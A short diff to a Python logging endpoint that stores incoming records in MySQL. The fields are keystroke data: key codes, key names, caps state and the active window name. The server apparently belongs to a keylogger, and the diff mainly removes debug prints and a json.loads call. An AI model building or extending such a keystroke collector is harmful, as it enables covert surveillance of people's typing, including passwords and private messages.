@@ -38,10 +38,8 @@ def addLog():
   
     try:
       print(data[str(key)])
-      print("PUSHING TO DB")
-      pushDB(json.loads(data[str(key)]))
+      pushDB(data[str(key)])
       
-      print("PUSHED TO DB")
 
     except Exception as e:
       print("Exception:",e)
@@ -54,8 +52,7 @@ def addLog():
 
 def pushDB(payload):
   main_cfg = load_cfg('./main_cfg.json')
-  print("connecting to db")
-  print(payload)
+
   db = mysql.connector.connect (
     host=main_cfg['dbHost'],
     port=main_cfg['port'],
@@ -68,12 +65,10 @@ def pushDB(payload):
   
   sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
   val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
-  print("executing query")
+
   mycursor.execute(sql, val)
   
-  print("committing db")
   db.commit()
-  print(mycursor.rowcount, "it worked!!!")
   return 0 
 
 
